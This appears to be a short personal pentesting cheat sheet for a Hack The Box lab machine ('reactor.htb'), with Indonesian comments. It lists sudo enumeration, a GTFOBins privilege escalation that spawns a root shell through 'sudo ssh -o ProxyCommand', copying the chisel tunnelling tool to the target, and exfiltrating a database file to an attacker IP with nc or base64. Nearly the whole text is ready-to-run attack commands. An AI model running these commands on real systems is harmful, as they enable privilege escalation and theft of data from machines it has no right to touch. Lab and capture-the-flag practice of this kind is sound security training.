# 1. Enumeration
```shell
sudo -l

#Bahaya
User privilege may run the following commands on ubuntu-virtual-machine:
    (ALL : ALL) ALL
```
[https://gtfobins.github.io/](https://gtfobins.github.io/)
`(root) /usr/bin/ssh * ` -> `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`
# 8. Send file from attacker to victim
```shell
scp chisel engineer@reactor.htb:~/.
```
# 9. Send File from victim shell to attacker shell
```shell
#pake nc
nc -lvp 4444 > reactor.db
nc 10.10.15.236 4444 < reactor.db

# pake base64
base64 reactor.db
echo 'asdasda' | base64 -d > reactor.db
```
